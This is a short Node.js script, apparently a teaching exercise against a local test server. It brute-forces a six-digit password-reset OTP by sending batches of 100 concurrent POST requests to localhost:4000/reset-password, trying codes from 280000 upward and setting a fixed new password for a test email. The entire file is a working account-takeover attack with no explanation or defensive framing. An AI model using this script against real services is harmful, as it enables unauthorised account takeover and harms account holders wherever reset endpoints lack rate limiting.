const axios = require('axios');

async function sendRequest(otp){
    let data = JSON.stringify({
        "email": "rohan@test.com",
        "otp": otp,
        "newPassword": "password"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:4000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };

      try {
          await axios.request(config)
          console.log("Done for OTP: "+otp)
      } catch (error) {
        
      }
}


async function attack(){
    for(let i=280000;i<1000000;i+=100){
        const promises = []
        console.log(i)
        for(let j=0;j<100;j++){
            promises.push(sendRequest((i+j).toString()))
        }

        await Promise.all(promises)
    }
}

attack();